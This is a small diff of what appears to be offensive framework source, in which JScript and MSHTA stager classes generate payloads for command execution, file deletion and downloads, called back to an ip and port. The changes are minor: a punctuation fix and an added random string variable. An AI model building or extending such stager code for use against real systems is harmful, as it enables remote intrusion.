@@ -212,7 +212,7 @@ class JScriptStager(Stager):
         '''}}''').format(self.variables['file-system-object'][0]))
 
         # Command Execution Options
-        self.functions['comspec'] = util.Function('comspec', 'Executes commands with the command sepecifier.', 'Command Execution Options', [self.functions['delfile'], self.functions['download']],
+        self.functions['comspec'] = util.Function('comspec', 'Executes commands with the command sepecifier', 'Command Execution Options', [self.functions['delfile'], self.functions['download']],
         (''' function comspec(command) {{ '''
            ''' stdout_path = {1} + '\\\{3}.txt'; '''
            ''' if ({2}.FileExists(stdout_path)) {{ '''
@@ -235,3 +235,4 @@ class MSHTAStager(JScriptStager):
 
     def __init__(self, ip, port):
         super().__init__(ip, port)
+        self.variables['random_str'] = (util.generate_str())
